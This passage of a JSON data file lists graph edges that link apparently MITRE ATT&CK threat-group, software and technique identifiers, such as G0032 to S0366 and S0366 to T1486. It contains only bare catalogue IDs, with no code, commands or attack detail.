            "source": "S1004",
            "target": "T0849"
        },
        {
            "source": "S1004",
            "target": "T0855"
        },
        {
            "source": "G0034",
            "target": "S1004"
        },
        {
            "source": "S1005",
            "target": "T0872"
        },
        {
            "source": "S1005",
            "target": "T0881"
        },
        {
            "source": "S1005",
            "target": "T0809"
        },
        {
            "source": "S1005",
            "target": "T0829"
        },
        {
            "source": "G0034",
            "target": "S1005"
        },
        {
            "source": "G0034",
            "target": "S0089"
        },
        {
            "source": "S0593",
            "target": "T1074.001"
        },
        {
            "source": "S0593",
            "target": "T1059.003"
        },
        {
            "source": "S0593",
            "target": "T1056.001"
        },
        {
            "source": "S0593",
            "target": "T1070.004"
        },
        {
            "source": "S0593",
            "target": "T1113"
        },
        {
            "source": "S0593",
            "target": "T1027"
        },
        {
            "source": "G0032",
            "target": "S0593"
        },
        {
            "source": "S0586",
            "target": "T1573.001"
        },
        {
            "source": "S0586",
            "target": "T1001.003"
        },
        {
            "source": "S0586",
            "target": "T1059.003"
        },
        {
            "source": "S0586",
            "target": "T1560"
        },
        {
            "source": "S0586",
            "target": "T1036.005"
        },
        {
            "source": "S0586",
            "target": "T1027.001"
        },
        {
            "source": "S0586",
            "target": "T1070.006"
        },
        {
            "source": "S0586",
            "target": "T1070.004"
        },
        {
            "source": "S0586",
            "target": "T1547.001"
        },
        {
            "source": "S0586",
            "target": "T1124"
        },
        {
            "source": "S0586",
            "target": "T1105"
        },
        {
            "source": "S0586",
            "target": "T1083"
        },
        {
            "source": "S0586",
            "target": "T1082"
        },
        {
            "source": "S0586",
            "target": "T1057"
        },
        {
            "source": "S0586",
            "target": "T1018"
        },
        {
            "source": "S0586",
            "target": "T1008"
        },
        {
            "source": "G0032",
            "target": "S0586"
        },
        {
            "source": "S0584",
            "target": "T1071.001"
        },
        {
            "source": "S0584",
            "target": "T1204.002"
        },
        {
            "source": "S0584",
            "target": "T1204.001"
        },
        {
            "source": "S0584",
            "target": "T1569.001"
        },
        {
            "source": "S0584",
            "target": "T1059.004"
        },
        {
            "source": "S0584",
            "target": "T1497.003"
        },
        {
            "source": "S0584",
            "target": "T1566.002"
        },
        {
            "source": "S0584",
            "target": "T1564.001"
        },
        {
            "source": "S0584",
            "target": "T1553.002"
        },
        {
            "source": "S0584",
            "target": "T1070.004"
        },
        {
            "source": "S0584",
            "target": "T1548.002"
        },
        {
            "source": "S0584",
            "target": "T1218.007"
        },
        {
            "source": "S0584",
            "target": "T1543.004"
        },
        {
            "source": "S0584",
            "target": "T1543.003"
        },
        {
            "source": "S0584",
            "target": "T1053.005"
        },
        {
            "source": "S0584",
            "target": "T1140"
        },
        {
            "source": "S0584",
            "target": "T1082"
        },
        {
            "source": "S0584",
            "target": "T1041"
        },
        {
            "source": "S0584",
            "target": "T1027"
        },
        {
            "source": "G0032",
            "target": "S0584"
        },
        {
            "source": "S0567",
            "target": "T1074.001"
        },
        {
            "source": "S0567",
            "target": "T1574"
        },
        {
            "source": "S0567",
            "target": "T1059.003"
        },
        {
            "source": "S0567",
            "target": "T1560"
        },
        {
            "source": "S0567",
            "target": "T1056.001"
        },
        {
            "source": "S0567",
            "target": "T1036.005"
        },
        {
            "source": "S0567",
            "target": "T1070.004"
        },
        {
            "source": "S0567",
            "target": "T1547"
        },
        {
            "source": "S0567",
            "target": "T1543.003"
        },
        {
            "source": "S0567",
            "target": "T1055.012"
        },
        {
            "source": "S0567",
            "target": "T1217"
        },
        {
            "source": "S0567",
            "target": "T1140"
        },
        {
            "source": "S0567",
            "target": "T1129"
        },
        {
            "source": "S0567",
            "target": "T1105"
        },
        {
            "source": "S0567",
            "target": "T1083"
        },
        {
            "source": "S0567",
            "target": "T1082"
        },
        {
            "source": "S0567",
            "target": "T1078"
        },
        {
            "source": "S0567",
            "target": "T1057"
        },
        {
            "source": "S0567",
            "target": "T1049"
        },
        {
            "source": "S0567",
            "target": "T1027"
        },
        {
            "source": "S0567",
            "target": "T1016"
        },
        {
            "source": "S0567",
            "target": "T1012"
        },
        {
            "source": "S0567",
            "target": "T1005"
        },
        {
            "source": "G0032",
            "target": "S0567"
        },
        {
            "source": "S0520",
            "target": "T1573.001"
        },
        {
            "source": "S0520",
            "target": "T1071.001"
        },
        {
            "source": "S0520",
            "target": "T1132.001"
        },
        {
            "source": "S0520",
            "target": "T1204.002"
        },
        {
            "source": "S0520",
            "target": "T1059.003"
        },
        {
            "source": "S0520",
            "target": "T1566.001"
        },
        {
            "source": "S0520",
            "target": "T1036.005"
        },
        {
            "source": "S0520",
            "target": "T1553.002"
        },
        {
            "source": "S0520",
            "target": "T1027.002"
        },
        {
            "source": "S0520",
            "target": "T1070.006"
        },
        {
            "source": "S0520",
            "target": "T1070.004"
        },
        {
            "source": "S0520",
            "target": "T1218.011"
        },
        {
            "source": "S0520",
            "target": "T1140"
        },
        {
            "source": "S0520",
            "target": "T1129"
        },
        {
            "source": "S0520",
            "target": "T1105"
        },
        {
            "source": "S0520",
            "target": "T1083"
        },
        {
            "source": "S0520",
            "target": "T1082"
        },
        {
            "source": "S0520",
            "target": "T1041"
        },
        {
            "source": "S0520",
            "target": "T1027"
        },
        {
            "source": "S0520",
            "target": "T1016"
        },
        {
            "source": "S0520",
            "target": "T1005"
        },
        {
            "source": "G0032",
            "target": "S0520"
        },
        {
            "source": "S0498",
            "target": "T1573"
        },
        {
            "source": "S0498",
            "target": "T1070.004"
        },
        {
            "source": "S0498",
            "target": "T1105"
        },
        {
            "source": "S0498",
            "target": "T1095"
        },
        {
            "source": "S0498",
            "target": "T1083"
        },
        {
            "source": "S0498",
            "target": "T1033"
        },
        {
            "source": "S0498",
            "target": "T1005"
        },
        {
            "source": "G0032",
            "target": "S0498"
        },
        {
            "source": "S0497",
            "target": "T1071.001"
        },
        {
            "source": "S0497",
            "target": "T1564.001"
        },
        {
            "source": "S0497",
            "target": "T1543.004"
        },
        {
            "source": "S0497",
            "target": "T1543.001"
        },
        {
            "source": "S0497",
            "target": "T1105"
        },
        {
            "source": "S0497",
            "target": "T1083"
        },
        {
            "source": "S0497",
            "target": "T1057"
        },
        {
            "source": "S0497",
            "target": "T1036"
        },
        {
            "source": "S0497",
            "target": "T1027"
        },
        {
            "source": "G0032",
            "target": "S0497"
        },
        {
            "source": "S0431",
            "target": "T1573.001"
        },
        {
            "source": "S0431",
            "target": "T1564.003"
        },
        {
            "source": "S0431",
            "target": "T1059.003"
        },
        {
            "source": "S0431",
            "target": "T1027.002"
        },
        {
            "source": "S0431",
            "target": "T1070.004"
        },
        {
            "source": "S0431",
            "target": "T1053.005"
        },
        {
            "source": "S0431",
            "target": "T1518"
        },
        {
            "source": "S0431",
            "target": "T1489"
        },
        {
            "source": "S0431",
            "target": "T1113"
        },
        {
            "source": "S0431",
            "target": "T1106"
        },
        {
            "source": "S0431",
            "target": "T1105"
        },
        {
            "source": "S0431",
            "target": "T1083"
        },
        {
            "source": "S0431",
            "target": "T1082"
        },
        {
            "source": "S0431",
            "target": "T1057"
        },
        {
            "source": "S0431",
            "target": "T1041"
        },
        {
            "source": "S0431",
            "target": "T1033"
        },
        {
            "source": "S0431",
            "target": "T1027"
        },
        {
            "source": "S0431",
            "target": "T1016"
        },
        {
            "source": "S0431",
            "target": "T1010"
        },
        {
            "source": "S0431",
            "target": "T1007"
        },
        {
            "source": "G0032",
            "target": "S0431"
        },
        {
            "source": "S0376",
            "target": "T1132.001"
        },
        {
            "source": "S0376",
            "target": "T1571"
        },
        {
            "source": "S0376",
            "target": "T1569.002"
        },
        {
            "source": "S0376",
            "target": "T1059.003"
        },
        {
            "source": "S0376",
            "target": "T1562.004"
        },
        {
            "source": "S0376",
            "target": "T1003.002"
        },
        {
            "source": "S0376",
            "target": "T1550.002"
        },
        {
            "source": "S0376",
            "target": "T1124"
        },
        {
            "source": "S0376",
            "target": "T1112"
        },
        {
            "source": "S0376",
            "target": "T1105"
        },
        {
            "source": "S0376",
            "target": "T1090"
        },
        {
            "source": "S0376",
            "target": "T1083"
        },
        {
            "source": "S0376",
            "target": "T1082"
        },
        {
            "source": "S0376",
            "target": "T1065"
        },
        {
            "source": "S0376",
            "target": "T1055"
        },
        {
            "source": "S0376",
            "target": "T1047"
        },
        {
            "source": "S0376",
            "target": "T1043"
        },
        {
            "source": "S0376",
            "target": "T1041"
        },
        {
            "source": "S0376",
            "target": "T1012"
        },
        {
            "source": "S0376",
            "target": "T1008"
        },
        {
            "source": "G0032",
            "target": "S0376"
        },
        {
            "source": "S0366",
            "target": "T1573.002"
        },
        {
            "source": "S0366",
            "target": "T1090.003"
        },
        {
            "source": "S0366",
            "target": "T1570"
        },
        {
            "source": "S0366",
            "target": "T1564.001"
        },
        {
            "source": "S0366",
            "target": "T1563.002"
        },
        {
            "source": "S0366",
            "target": "T1222.001"
        },
        {
            "source": "S0366",
            "target": "T1543.003"
        },
        {
            "source": "S0366",
            "target": "T1490"
        },
        {
            "source": "S0366",
            "target": "T1489"
        },
        {
            "source": "S0366",
            "target": "T1486"
        },
        {
            "source": "S0366",
            "target": "T1210"
        },
        {
            "source": "S0366",
            "target": "T1120"
        },
        {
            "source": "S0366",
            "target": "T1083"
        },
        {
            "source": "S0366",
            "target": "T1047"
        },
        {
            "source": "S0366",
            "target": "T1018"
        },
        {
            "source": "S0366",
            "target": "T1016"
        },
        {
            "source": "S0366",
            "target": "T0866"
        },
        {
            "source": "S0366",
            "target": "T0822"
        },
        {
            "source": "S0366",
            "target": "T0867"
        },
        {
            "source": "G0032",
            "target": "S0366"
        },
        {
            "source": "S0364",
            "target": "T1561.002"
        },
        {
            "source": "S0364",
            "target": "T1561.001"
        },
        {
            "source": "S0364",
            "target": "T1485"
        },
        {
            "source": "G0032",
            "target": "S0364"
        },
        {
            "source": "S0347",
            "target": "T1059.003"
        },
        {
            "source": "S0347",
            "target": "T1070.004"
        },
        {
            "source": "S0347",
            "target": "T1543.003"
        },
        {
            "source": "S0347",
            "target": "T1140"
        },
        {
            "source": "S0347",
            "target": "T1105"
        },
        {
            "source": "S0347",
            "target": "T1090"
        },
        {
            "source": "S0347",
            "target": "T1083"
        },
        {
            "source": "S0347",
            "target": "T1055"
        },
        {
            "source": "S0347",
            "target": "T1043"
        },
        {
            "source": "S0347",
            "target": "T1027"
        },
        {
            "source": "G0032",
            "target": "S0347"
        },
        {
            "source": "S0245",
            "target": "T1573.001"
        },
        {
            "source": "S0245",
            "target": "T1001.003"
        },
        {
            "source": "S0245",
            "target": "T1571"
        },
        {
            "source": "S0245",
            "target": "T1562.004"
        },
        {
            "source": "S0245",
            "target": "T1112"
        },
        {
            "source": "S0245",
            "target": "T1090"
        },
        {
            "source": "S0245",
            "target": "T1082"
        },
        {
            "source": "S0245",
            "target": "T1043"
        },
        {
            "source": "S0245",
            "target": "T1016"
        },
        {
            "source": "G0032",
            "target": "S0245"
        },
        {
            "source": "S0246",
            "target": "T1001.003"
        },
        {
            "source": "S0246",
            "target": "T1571"
        },
        {
            "source": "S0246",
            "target": "T1059.003"
        },
        {
            "source": "S0246",
            "target": "T1562.004"
        },
        {
            "source": "S0246",
            "target": "T1090"
        },
        {
            "source": "S0246",
            "target": "T1043"
        },
        {
            "source": "G0032",
            "target": "S0246"
        },
        {
            "source": "S0241",
            "target": "T1071.001"
        },
        {
            "source": "S0241",
            "target": "T1059.003"
        },
        {
            "source": "S0241",
            "target": "T1059.001"
        },
        {
            "source": "S0241",
            "target": "T1087.001"
        },
        {
            "source": "S0241",
            "target": "T1055.001"
        },
        {
            "source": "S0241",
            "target": "T1105"
        },
        {
            "source": "S0241",
            "target": "T1082"
        },
        {
            "source": "S0241",
            "target": "T1057"
        },
        {
            "source": "S0241",
            "target": "T1049"
        },
        {
            "source": "S0241",
            "target": "T1047"
        },
        {
            "source": "S0241",
            "target": "T1043"
        },
        {
            "source": "S0241",
            "target": "T1033"
        },
        {
            "source": "S0241",
            "target": "T1018"
        },
        {
            "source": "S0241",
            "target": "T1016"
        },
        {
            "source": "S0241",
            "target": "T1012"
        },
        {
            "source": "S0241",
            "target": "T1007"
        },
        {
            "source": "G0032",
            "target": "S0241"
        },
        {
            "source": "S0239",
            "target": "T1071.001"
        },
        {
            "source": "S0239",
            "target": "T1001.003"
        },
        {
            "source": "S0239",
            "target": "T1132.002"
        },
        {
            "source": "S0239",
            "target": "T1571"
        },
        {
            "source": "S0239",
            "target": "T1059.003"
        },
        {
            "source": "S0239",
            "target": "T1087.002"
        },
        {
            "source": "S0239",
            "target": "T1087.001"
        },
        {
            "source": "S0239",
            "target": "T1134.002"
        },
        {
            "source": "S0239",
            "target": "T1070.006"
        },
        {
            "source": "S0239",
            "target": "T1070.004"
        },
        {
            "source": "S0239",
            "target": "T1543.003"
        },
        {
            "source": "S0239",
            "target": "T1203"
        },
        {
            "source": "S0239",
            "target": "T1140"
        },
        {
            "source": "S0239",
            "target": "T1119"
        },
        {
            "source": "S0239",
            "target": "T1112"
        },
        {
            "source": "S0239",
            "target": "T1106"
        },
        {
            "source": "S0239",
            "target": "T1105"
        },
        {
            "source": "S0239",
            "target": "T1083"
        },
        {
            "source": "S0239",
            "target": "T1082"
        },
        {
            "source": "S0239",
            "target": "T1070"
        },
        {
            "source": "S0239",
            "target": "T1065"
        },
        {
            "source": "S0239",
            "target": "T1057"
        },
        {
            "source": "S0239",
            "target": "T1041"
        },
        {
            "source": "S0239",
            "target": "T1012"
        },
        {
            "source": "S0239",
            "target": "T1005"
        },
        {
            "source": "G0032",
            "target": "S0239"
        },
        {
            "source": "S0271",
            "target": "T1573.001"
        },
        {
            "source": "S0271",
            "target": "T1059.003"
        },
        {
            "source": "S0271",
            "target": "T1070.004"
        },
        {
            "source": "S0271",
            "target": "T1113"
        },
        {
            "source": "S0271",
            "target": "T1112"
        },
        {
            "source": "S0271",
            "target": "T1105"
        },
        {
            "source": "S0271",
            "target": "T1083"
        },
        {
            "source": "S0271",
            "target": "T1082"
        },
        {
            "source": "S0271",
            "target": "T1057"
        },
        {
            "source": "S0271",
            "target": "T1043"
        },
        {
            "source": "S0271",
            "target": "T1016"
        },
        {
            "source": "G0032",
            "target": "S0271"
        },
        {
            "source": "S0238",
            "target": "T1071.001"
        },
        {
            "source": "S0238",
            "target": "T1569.002"
        },
        {
            "source": "S0238",
            "target": "T1059.003"
        },
        {
            "source": "S0238",
            "target": "T1070.004"
        },
        {
            "source": "S0238",
            "target": "T1485"
        },
        {
            "source": "S0238",
            "target": "T1124"
        },
        {
            "source": "S0238",
            "target": "T1119"
        },
        {
            "source": "S0238",
            "target": "T1083"
        },
        {
            "source": "S0238",
            "target": "T1082"
        },
        {
            "source": "S0238",
            "target": "T1057"
        },
        {
            "source": "S0238",
            "target": "T1043"
        },
        {
            "source": "S0238",
            "target": "T1041"
        },
        {
            "source": "S0238",
            "target": "T1016"
        },
        {
            "source": "S0238",
            "target": "T1012"
        },
        {
            "source": "S0238",
            "target": "T1005"
        },
        {
            "source": "G0032",
            "target": "S0238"
        },
        {
            "source": "S0263",
            "target": "T1571"
        },
        {
            "source": "S0263",
            "target": "T1204.002"
        },
        {
            "source": "S0263",
            "target": "T1059.005"
        },
        {
            "source": "S0263",
            "target": "T1059.003"
        },
        {
            "source": "S0263",
            "target": "T1562.004"
        },
        {
            "source": "S0263",
            "target": "T1070.004"
        },
        {
            "source": "S0263",
            "target": "T1543.003"
        },
        {
            "source": "S0263",
            "target": "T1140"
        },
        {
            "source": "S0263",
            "target": "T1112"
        },
        {
            "source": "S0263",
            "target": "T1105"
        },
        {
            "source": "S0263",
            "target": "T1094"
        },
        {
            "source": "S0263",
            "target": "T1090"
        },
        {
            "source": "S0263",
            "target": "T1083"
        },
        {
            "source": "S0263",
            "target": "T1082"
        },
        {
            "source": "S0263",
            "target": "T1065"
        },
        {
            "source": "S0263",
            "target": "T1043"
        },
        {
            "source": "S0263",
            "target": "T1027"
        },
        {
            "source": "G0032",
            "target": "S0263"
        },
        {
            "source": "S0180",
            "target": "T1573.002"
        },
        {
            "source": "S0180",
            "target": "T1573.001"
        },
        {
            "source": "S0180",
            "target": "T1059.003"
        },
        {
            "source": "S0180",
            "target": "T1036.004"
        },
        {
            "source": "S0180",
            "target": "T1070.004"
        },
        {
            "source": "S0180",
            "target": "T1543.003"
        },
        {
            "source": "S0180",
            "target": "T1140"
        },
        {
            "source": "S0180",
            "target": "T1112"
        },
        {
            "source": "S0180",
            "target": "T1106"
        },
        {
            "source": "S0180",
            "target": "T1105"
        },
        {
            "source": "S0180",
            "target": "T1094"
        },
        {
            "source": "S0180",
            "target": "T1083"
        },
        {
            "source": "S0180",
            "target": "T1082"
        },
        {
            "source": "S0180",
            "target": "T1065"
        },
        {
            "source": "S0180",
            "target": "T1057"
        },
        {
            "source": "S0180",
            "target": "T1049"
        },
        {
            "source": "S0180",
            "target": "T1043"
        },
        {
            "source": "S0180",
            "target": "T1027"
        },
        {
            "source": "S0180",
            "target": "T1016"
        },
        {
            "source": "S0180",
            "target": "T1012"
        },
        {
            "source": "S0180",
            "target": "T1007"
        },
        {
            "source": "G0032",
            "target": "S0180"
        },
        {
            "source": "S0181",
            "target": "T1573.001"
        },
        {
            "source": "S0181",
            "target": "T1001.003"
        },
        {
            "source": "S0181",
            "target": "T1070.006"
        },
        {
            "source": "S0181",
            "target": "T1070.004"
        },
        {
            "source": "S0181",
            "target": "T1543.003"
        },
        {
            "source": "S0181",
            "target": "T1083"
        },
        {
            "source": "S0181",
            "target": "T1082"
        },
        {
            "source": "S0181",
            "target": "T1016"
        },
        {
            "source": "G0032",
            "target": "S0181"
        },
        {
            "source": "S0108",
            "target": "T1518.001"
        },
        {
            "source": "S0108",
            "target": "T1562.004"
        },
        {
            "source": "S0108",
            "target": "T1546.007"
        },
        {
            "source": "S0108",
            "target": "T1090"
        },
        {
            "source": "G0032",
            "target": "S0108"
        },
        {
            "source": "G0032",
            "target": "S0002"
        },
        {
            "source": "G0032",
            "target": "S0366"
        },
        {
            "source": "S0345",
            "target": "T1071.001"
        },
        {
            "source": "S0345",
            "target": "T1059.003"
        },
        {
            "source": "S0345",
            "target": "T1036.004"
        },
        {
            "source": "S0345",
            "target": "T1070.004"
        },
        {
            "source": "S0345",
            "target": "T1547.001"
        },
        {
            "source": "S0345",
            "target": "T1543.003"
        },
        {
            "source": "S0345",
            "target": "T1105"
        },
        {
            "source": "S0345",
            "target": "T1094"
        },
        {
            "source": "S0345",
            "target": "T1083"
        },
        {
            "source": "S0345",
            "target": "T1057"
        },
        {
            "source": "S0345",
            "target": "T1027"
        },
        {
            "source": "G0006",
            "target": "S0345"
        },
        {
            "source": "S0123",
            "target": "T1569.002"
        },
        {
            "source": "G0006",
            "target": "S0123"
        },
        {
            "source": "S0122",
            "target": "T1550.002"
        },
        {
            "source": "G0006",
            "target": "S0122"
        },
        {
            "source": "S0121",
            "target": "T1003.001"
        },
        {
            "source": "G0006",
            "target": "S0121"
        },
        {
            "source": "S0119",
            "target": "T1003.005"
        },
        {
            "source": "G0006",
            "target": "S0119"
        },
        {
            "source": "S0109",
            "target": "T1574.001"
        },
        {
            "source": "S0109",
            "target": "T1059.003"
        },
        {
            "source": "S0109",
            "target": "T1105"
        },
        {
            "source": "G0006",
            "target": "S0109"
        },
        {
            "source": "S0100",
            "target": "T1016"
        },
        {
            "source": "G0006",
            "target": "S0100"
        },
        {
            "source": "S0057",
            "target": "T1518.001"
        },
        {
            "source": "S0057",
            "target": "T1057"
        },
        {
            "source": "S0057",
            "target": "T1007"
        },
        {
            "source": "G0006",
            "target": "S0057"
        },
        {
            "source": "S0039",
            "target": "T1069.001"
        },
        {
            "source": "S0039",
            "target": "T1569.002"
        },
        {
            "source": "S0039",
            "target": "T1069.002"
        },
        {
            "source": "S0039",
            "target": "T1087.002"
        },
        {
            "source": "S0039",
            "target": "T1087.001"
        },
        {
            "source": "S0039",
            "target": "T1021.002"
        },
        {
            "source": "S0039",
            "target": "T1070.005"
        },
        {
            "source": "S0039",
            "target": "T1136.002"
        },
        {
            "source": "S0039",
            "target": "T1136.001"
        },
        {
            "source": "S0039",
            "target": "T1201"
        },
        {
            "source": "S0039",
            "target": "T1135"
        },
        {
            "source": "S0039",
            "target": "T1124"
        },
        {
            "source": "S0039",
            "target": "T1049"
        },
        {
            "source": "S0039",
            "target": "T1018"
        },
        {
            "source": "S0039",
            "target": "T1007"
        },
        {
            "source": "G0006",
            "target": "S0039"
        },
        {
            "source": "G0006",
            "target": "S0029"
        },
        {
            "source": "S0026",
            "target": "T1102.002"
        },
        {
            "source": "G0006",
            "target": "S0026"
        },
        {
            "source": "S0025",
            "target": "T1102.002"
        },
        {
            "source": "S0025",
            "target": "T1059.003"
        },
        {
            "source": "G0006",
            "target": "S0025"
        },
        {
            "source": "S0017",
            "target": "T1573.002"
        },
        {
            "source": "S0017",
            "target": "T1059.003"
        },
        {
            "source": "S0017",
            "target": "T1056.001"
        },
        {
            "source": "S0017",
            "target": "T1113"
        },
        {
            "source": "S0017",
            "target": "T1105"
        },
        {
            "source": "S0017",
            "target": "T1094"
        },
        {
            "source": "S0017",
            "target": "T1082"
        },
        {
            "source": "S0017",
            "target": "T1057"
        },
        {
            "source": "S0017",
            "target": "T1033"
        },
        {
            "source": "S0017",
            "target": "T1008"
        },
        {
            "source": "G0006",
            "target": "S0017"
        },
        {
            "source": "S0012",
            "target": "T1547.014"
        },
        {
            "source": "S0012",
            "target": "T1573.001"
        },
        {
            "source": "S0012",
            "target": "T1074.001"
        },
        {
            "source": "S0012",
            "target": "T1059.003"
        },
        {
            "source": "S0012",
            "target": "T1056.001"
        },
        {
            "source": "S0012",
            "target": "T1547.001"
        },
        {
            "source": "S0012",
            "target": "T1543.003"
        },
        {
            "source": "S0012",
            "target": "T1055.001"
        },
        {
            "source": "S0012",
            "target": "T1112"
        },
        {
            "source": "S0012",
            "target": "T1105"
        },
        {
            "source": "S0012",
            "target": "T1065"
        },
        {
            "source": "S0012",
            "target": "T1027"
        },
        {
            "source": "S0012",
            "target": "T1014"
        },
        {
            "source": "S0012",
            "target": "T1010"
        },
        {
            "source": "S0012",
            "target": "T1005"
        },
        {
            "source": "G0006",
            "target": "S0012"
        },
        {
            "source": "S0008",
            "target": "T1003.004"
        },
        {
            "source": "S0008",
            "target": "T1003.002"
        },
        {
            "source": "G0006",
            "target": "S0008"
        },
        {
            "source": "S0006",
            "target": "T1003.002"
        },
        {
            "source": "G0006",
            "target": "S0006"
        },
        {
            "source": "G0006",
            "target": "S0002"
        }
    ]
}